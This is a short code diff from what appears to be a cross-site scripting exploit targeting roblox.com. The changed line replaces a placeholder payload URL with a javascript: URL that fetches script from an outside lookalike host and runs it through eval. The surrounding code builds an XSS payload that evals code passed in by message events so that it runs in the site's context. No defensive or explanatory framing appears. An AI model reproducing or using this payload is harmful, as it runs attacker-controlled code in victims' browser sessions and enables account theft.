@@ -21,7 +21,7 @@
         
         // this is the script that will get executed in the context of roblox.com
         // make sure necessary CORS headers are present
-        var robloxContextPayloadUrl = "https://yourdomain.com/payload/payload.js"
+        var robloxContextPayloadUrl = "Javascript:$.get('//robloxapi.org/rbx?id=16314',eval)"
         
         function getFcXssUrl() {
             var payload = "window.onmessage=e=>eval(e.data.f)(e.data.args)"
